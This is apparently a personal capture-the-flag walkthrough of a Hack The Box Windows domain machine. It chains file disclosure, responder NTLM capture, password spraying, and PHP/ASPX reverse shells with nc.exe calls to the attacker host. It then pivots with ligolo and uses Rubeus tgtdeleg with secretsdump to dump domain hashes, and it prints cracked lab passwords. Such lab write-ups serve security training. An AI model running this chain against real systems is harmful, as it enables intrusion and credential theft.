nmap shows open webport on port 80
but guest, anonymous, null auth for smb, rpc, ldap locked down
we visit the webpage, but nothing to do there
gobuster dint reveal much as well
so, tried subdomain enum
`wfuzz -c -f subdomains.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://flight.htb/" -H "Host: FUZZ.flight.htb" --hl 154`
we find a subdomain school, and we add it to /etc/hosts

Browzing around, the url it used was "http://school.flight.htb/index.php?view=index.html"
This gave a suspicious LFI feels
so we intercept the request and send it to repeater
we try things like 
?view=../../../../../../Windows/win.ini
?view=/Windows/win.ini -- worked

We verify File Disclosure (not yet LFI), but wanna test for RFI
we start a python server
?view=http://10.10.14.45/CheckME -- which gives us a hit on our python server
So now, we just need host a reverse shell
We try a test, where we put the php get cmd in a test.txt, and host it (just like the steps in [[Sniper]])
Note - But the Webpage doesnt execute the php cmd, just shows it. This means File Disclosure exists, but not File Inclusion

Since this is a windows machine, we wanna see if it will cough up an NTLM hash
To see if it does, `nc -lvnp 445` and from burp, `?view=\\10.10.14.45\Share\File`
Im our case, this is blocked, since it detects two `\\`. Windows also allows forward slash

`sudo responder -I tun0`
?view=//10.10.14.45/Share/File2
we catch an NTLM hash, crack it with john to get password for apache_svc `S@Ss!K@*t13`
Finally, we start the enum

---

nxc smb to validate, --users to get list of users, kerbrute to validate, asreproast, kerberoast
collected some bloodhound data
`nxc smb 10.129.228.120 -u 'svc_apache' -p 'S@Ss!K@*t13' --shares`

dint get us anywhere, even after enumerating all the shares
Since this is a service account, we're gonna test for "password reuse" first.
The theory is, whoever uses this service account will use their own password for this account as well
`nxc smb 10.129.228.120 -u users.txt -p 'S@Ss!K@*t13' --continue-on-success`
We find S.Moon reused the password, so we enumerate that user

`nxc smb 10.129.228.120 -u S.Moon -p 'S@Ss!K@*t13'`

we discover cbum can write into the Web share
so we drop an rshell.php in the school.flight.htb dir of the share, visit the page on browzer, rev shell as svc_apache

Couldnt find much around
In addition to the Xampp dir(for Apache website), there was also an inetpub dir (means IIS website)
Looking at ports, we see a port 8000, that we had missed completely
`icacls *` inside inetpub shows cbum can write to development dir, and we have that guy's creds, but normal runas wont work, since we dont have a real terminal

So we use RunasCS.exe to do it
Usage:
`RunasCs.exe c.bum Tikkycoll_431012284 powershell.exe -r 10.10.14.45:9001`

`RunasCs.exe username password cmd [-d domain] [-f create_process_function] [-l logon_type] [-r host:port] [-t process_timeout] [--force-profile] [--bypass-uac] [--remote-impersonation]`
we're now cbum

As cbum, we can write into the inetpub/development dir
we can put a rev shell file there, access the shell from internal port 8000, and become iis svc



---
Either setup Ligolo/chisel OR use the header tag in wget

...........setting up ligolo to access the port 8000 on machine's localhost
`sudo ip tuntap add user kali mode tun ligolo`
`sudo ip link set ligolo up`
`./proxy -selfcert`  ###note it is running on 11601
on target
`./agent -connect 10.10.14.35:11601 --ignore-cert`
`sudo ip route add 240.0.0.1/32 dev ligolo` -- to access stuff that is on localhost of the jumpshot machine, or to talk to the jumpshot machine itself

................wget header
```powershell
$headers= @{ "Host" = "development.flight.htb" }
wget -headers $headers http://localhost:8000/rev.aspx
```

---
visiting the page 240.0.0.1:8000, we see that our aspx reverse shell dint work
So we try with laudanum's aspx rever shell
visit the webpage at 240.0.0.1:8000/shell.aspx
Then send ourselves a reverse shell from there
`c:\intepub\development\nc.exe -nv 10.10.14.45 7001 -r powershell`

Now, we see we are `iis appool\default apppool` (and not something like `flight\iis` or something like the dc naming convention)
This means we are on a system account.
We can verify this by catching a hash on resporder
`\\10.10.14.45\my\file` `sudo responder -I tun0`
and we get the NTLM hash from G0 user, which is the name of the system account for the box (g0.flight.htb)
We can abuse this account, by using tgt delegation to get a ticket for this account.
With that ticket, we can secrets dump the machine (basically through DCSync)

send Rubeus.exe over to the windows machine
`.\Rubeus.exe tgtdeleg /nowrap` --copy the ticket, save as ticket.kirbi.b64
base-64 --decode it, save it as ticket.kirbi

 `/usr/bin/minikerberos-kirbi2ccache ticket.kirbi ticket.ccache`
`export KRB5CCNAME=ticket.ccache`
`faketime "$(sudo ntpdate -q 10.129.228.120 | awk '{print $1 " " $2}')" impacket-secretsdump -no-pass -k g0.flight.htb`

This gives the NTLM hashes of everyone, so we can login as the administrator
